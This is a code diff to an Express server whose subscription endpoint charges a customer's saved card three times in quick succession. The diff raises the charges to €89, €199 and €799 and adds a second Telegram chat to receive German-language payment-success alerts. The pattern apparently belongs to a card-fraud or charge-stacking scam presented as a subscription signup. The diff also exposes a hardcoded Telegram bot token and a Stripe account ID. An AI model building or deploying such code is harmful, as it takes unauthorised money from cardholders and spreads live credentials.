@@ -8,6 +8,7 @@ const app = express();
 const ACCOUNT_B = 'acct_1SmGL70gWtvqOjtp';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
+const TELEGRAM_CHAT_ID_2 = '715805541';
 
 async function sendTelegram(message) {
   try {
@@ -16,6 +17,15 @@ async function sendTelegram(message) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID_2,
         text: message,
         parse_mode: 'HTML'
       })
@@ -86,10 +96,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €1.09
+    // Charge 1 — €89.00
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 109,
+        amount: 8900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -106,10 +116,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €500
+    // Charge 2 — €199
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 50000,
+        amount: 19900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -126,10 +136,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €500
+    // Charge 3 — €799
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 50000,
+        amount: 79900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -160,9 +170,9 @@ app.post('/create-subscription', async (req, res) => {
     await sendTelegram(
       `✅ <b>Zahlung erfolgreich!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
-      `💳 Payment 1: €1.09\n` +
-      `💳 Payment 2: €500\n` +
-      `💳 Payment 3: €500\n` +
+      `💳 Payment 1: €89.00\n` +
+      `💳 Payment 2: €199.00\n` +
+      `💳 Payment 3: €799.00\n` +
       `🆔 Subscription: ${subscription.id}\n` +
       `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
     );
